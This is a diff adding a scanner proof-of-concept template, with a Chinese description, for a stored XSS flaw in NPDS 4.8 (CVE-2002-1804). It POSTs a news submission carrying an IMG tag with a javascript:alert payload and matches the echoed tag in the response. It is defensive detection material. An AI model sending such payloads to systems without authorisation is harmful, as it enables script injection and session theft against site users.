@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "检测 NPDS 4.8 跨站脚本（XSS）漏洞。该漏洞存在于新闻发布功能中，攻击者可在 IMG 标签中注入 JavaScript 代码，当其他用户查看包含该恶意 IMG 标签的新闻时，将在其浏览器中执行任意脚本，导致 Cookie 窃取或会话劫持。"
+id = "POC-AVE-2002-0683"
+name = "NPDS 4.8 IMG 标签 XSS 漏洞 PoC"
+severity = "medium"
+tags = ["ave-2002-0683"]
+vuln_id = [
+    "CVE-2002-1804",
+    "AVE-2002-0683",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "title=AVE+2002+0683+XSS+Test&hometext=%3CIMG+SRC%3D%22javascript%3Aalert('XSS')%22%3E&op=SubmitNews"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["""<IMG SRC="javascript:alert('XSS')">"""]
